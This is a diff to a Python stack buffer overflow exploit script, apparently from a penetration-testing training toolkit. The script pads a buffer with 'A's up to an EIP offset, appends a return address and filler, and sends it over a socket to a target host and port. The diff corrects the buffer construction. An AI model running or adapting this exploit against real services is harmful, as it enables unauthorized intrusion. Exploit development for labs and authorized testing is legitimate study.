@@ -25,17 +25,19 @@ target = sys.argv[1]
 port = int(sys.argv[2])
 eip = int(sys.argv[3])
 ret = "change me!"
+
 if len(sys.argv) == 5:
     cmd = sys.argv[4] + " "
 else:
     cmd = ""
 
+cmd = cmd.lstrip(" ")
 
 if ret == "change me!":
     print("you need to change \"ret\" to the output of \"./jump.py [return address]\"")
     exit(0)
 
-inputBuffer = cmd + "A" * eip - len(cmd) + ret 
+inputBuffer = cmd + "A" * eip + ret + "B" * 100
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,port))
 print("sending buffer")
